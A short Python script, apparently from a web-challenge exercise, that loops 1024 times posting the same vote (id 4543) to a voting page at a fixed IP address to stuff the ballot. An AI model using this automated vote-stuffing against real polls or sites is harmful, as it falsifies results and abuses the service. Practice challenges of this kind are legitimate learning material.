#!/usr/bin/python3
"""
	This is a script that votes 1024 times
	for your id here: http://158.69.76.135/level0.php.
"""

import requests
from bs4 import BeautifulSoup

URL = "http://158.69.76.135/level0.php"
amount_votes = 1024
with requests.session() as session:
	for i in range(amount_votes):
		r = session.get(URL)
		soup = BeautifulSoup(r.text, "html.parser")
		credentials = {"id": 4543, "holdthedoor": "submit"}
		vote = session.post(URL, data=credentials)
